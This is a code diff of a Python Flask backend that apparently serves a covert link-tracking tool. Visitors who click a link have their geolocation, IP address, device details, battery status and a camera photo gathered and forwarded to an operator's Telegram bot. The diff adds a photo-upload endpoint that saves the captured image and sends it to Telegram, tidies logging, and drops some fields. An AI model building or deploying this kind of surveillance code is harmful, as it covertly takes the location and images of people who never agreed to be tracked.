@@ -16,62 +16,36 @@ TELEGRAM_PHOTO_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
 # ✅ Store users who clicked the link
 tracked_users = {}
 
+UPLOAD_FOLDER = "uploads"
+os.makedirs(UPLOAD_FOLDER, exist_ok=True)
+
 def send_telegram_message(text):
     """Send text message to Telegram bot."""
     payload = {"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
     try:
-        response = requests.post(TELEGRAM_API, json=payload)
-        print("📩 Message Response:", response.text)  # ✅ Debugging
+        requests.post(TELEGRAM_API, json=payload)
     except Exception as e:
         print("❌ Error sending message:", str(e))
-
-def send_telegram_photo(image_url, caption):
-    """Send an image to Telegram bot."""
-    payload = {"chat_id": CHAT_ID, "caption": caption, "photo": image_url}
-    try:
-        response = requests.post(TELEGRAM_PHOTO_API, json=payload)
-        print("📷 Photo Response:", response.text)  # ✅ Debugging
-    except Exception as e:
-        print("❌ Error sending photo:", str(e))
-
-@app.route('/')
-def home():
-    return "✅ Flask backend is live!"
 
 @app.route('/track/<session_id>', methods=['POST', 'OPTIONS'])
 def track_device(session_id):
     """Track multiple users and send data to Telegram."""
     if request.method == "OPTIONS":
-        response = jsonify({"status": "CORS Preflight OK"})
-        response.headers["Access-Control-Allow-Origin"] = "*"
-        response.headers["Access-Control-Allow-Methods"] = "POST, OPTIONS"
-        response.headers["Access-Control-Allow-Headers"] = "Content-Type"
-        return response, 200
+        return jsonify({"status": "CORS Preflight OK"}), 200
 
     try:
-        print("📥 Received request for tracking!")  # Debugging
-
         data = request.get_json()
         if not data:
-            print("❌ Error: No JSON received!")
             return jsonify({"error": "Invalid JSON data"}), 400
-
-        print("📦 Received Data:", request.data[:200])  # Log first 200 chars)  # Log full request
 
         battery = data.get("battery", {})
         geo = data.get("geo", {})
         device = data.get("device", {})
-        photo = data.get("photo", None)
 
-        # ✅ Check if user is already tracked
         user_ip = device.get("ip", "Unknown")
-        if user_ip in tracked_users:
-            message_status = "🔁 User revisited."
-        else:
-            message_status = "🆕 New User Clicked the Link!"
-            tracked_users[user_ip] = session_id  # Store user IP and session
+        message_status = "🔁 User revisited." if user_ip in tracked_users else "🆕 New User Clicked the Link!"
+        tracked_users[user_ip] = session_id  
 
-        # ✅ Format Message
         message = f"""
 <b>{message_status}</b>
 📡 <b>Session ID:</b> {session_id}
@@ -82,30 +56,34 @@ def track_device(session_id):
 💻 <b>Screen:</b> {device.get("screenWidth", "N/A")}x{device.get("screenHeight", "N/A")}
 🌐 <b>IP Address:</b> {user_ip}
 🖥 <b>User-Agent:</b> {device.get("userAgent", "N/A")}
-🔌 <b>Cookies Enabled:</b> {device.get("cookiesEnabled", "N/A")}
-🧩 <b>Plugins:</b> {device.get("plugins", "N/A")}
 """
 
         send_telegram_message(message)
-
-        # ✅ Handle Photo
-        if photo:
-            try:
-                print("📸 Received Photo (First 100 chars):", photo[:100])
-                send_telegram_photo(photo, "📷 Captured Photo")
-            except Exception as e:
-                print("❌ Error sending photo:", str(e))
-
-        response = jsonify({"status": "success"})
-        response.headers["Access-Control-Allow-Origin"] = "*"
-        return response, 200
+        return jsonify({"status": "success"}), 200
 
     except Exception as e:
-        print("❌ Critical Error:", str(e))
-        response = jsonify({"error": str(e)})
-        response.headers["Access-Control-Allow-Origin"] = "*"
-        return response, 500
+        return jsonify({"error": str(e)}), 500
+
+@app.route('/upload-photo/<session_id>', methods=['POST'])
+def upload_photo(session_id):
+    """Save uploaded photo and send to Telegram."""
+    try:
+        if 'photo' not in request.files:
+            return jsonify({"error": "No file uploaded"}), 400
+
+        photo = request.files['photo']
+        photo_path = os.path.join(UPLOAD_FOLDER, f"{session_id}.jpg")
+        photo.save(photo_path)
+
+        with open(photo_path, "rb") as f:
+            requests.post(TELEGRAM_PHOTO_API, files={"photo": f}, data={"chat_id": CHAT_ID, "caption": "📷 Captured Photo"})
+
+        os.remove(photo_path)
+        return jsonify({"status": "success"}), 200
+
+    except Exception as e:
+        return jsonify({"error": str(e)}), 500
 
 if __name__ == '__main__':
-    port = int(os.getenv("PORT", 10000))  # ✅ Use Render-assigned PORT or default 10000
+    port = int(os.getenv("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
